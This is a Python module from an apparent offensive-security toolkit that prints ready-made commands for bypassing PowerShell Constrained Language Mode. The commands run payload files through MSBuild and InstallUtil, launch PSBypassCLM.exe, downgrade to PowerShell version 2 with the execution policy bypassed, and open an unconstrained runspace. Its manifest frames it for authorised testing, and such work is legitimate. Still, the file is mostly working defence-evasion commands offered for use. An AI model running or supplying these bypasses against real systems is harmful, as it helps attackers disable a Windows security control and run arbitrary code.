"""CLM (Constrained Language Mode) bypass for PowerShell."""
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.evasion.clm_bypass.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["language_mode_change"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1059.001"],
}

BYPASSES = {
    "msbuild": (
        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.csproj"
    ),
    "installutil": (
        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll"
    ),
    "psbypassclm": (
        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U PSBypassCLM.exe"
    ),
    "powershell_v2": "powershell.exe -version 2 -ep bypass",
    "runspace": (
        "[System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace().Open();"
        "$rs=[runspacefactory]::CreateRunspace();"
        "$rs.ApartmentState='STA';$rs.ThreadOptions='ReuseThread';$rs.Open();"
        "$p=$rs.CreatePipeline();$p.Commands.AddScript('$ExecutionContext.SessionState.LanguageMode');"
        "$p.Invoke()"
    ),
}


def run(args: Any) -> int:
    technique = getattr(args, "clm_technique", "msbuild")

    payload = BYPASSES.get(technique)
    if not payload:
        print("[!] Unknown: {} (available: {})".format(technique, ", ".join(BYPASSES.keys())))
        return 1

    print(f"[*] CLM bypass ({technique}):")
    print(f"  {payload}")
    print("\n[*] Check current mode: $ExecutionContext.SessionState.LanguageMode")
    return 0
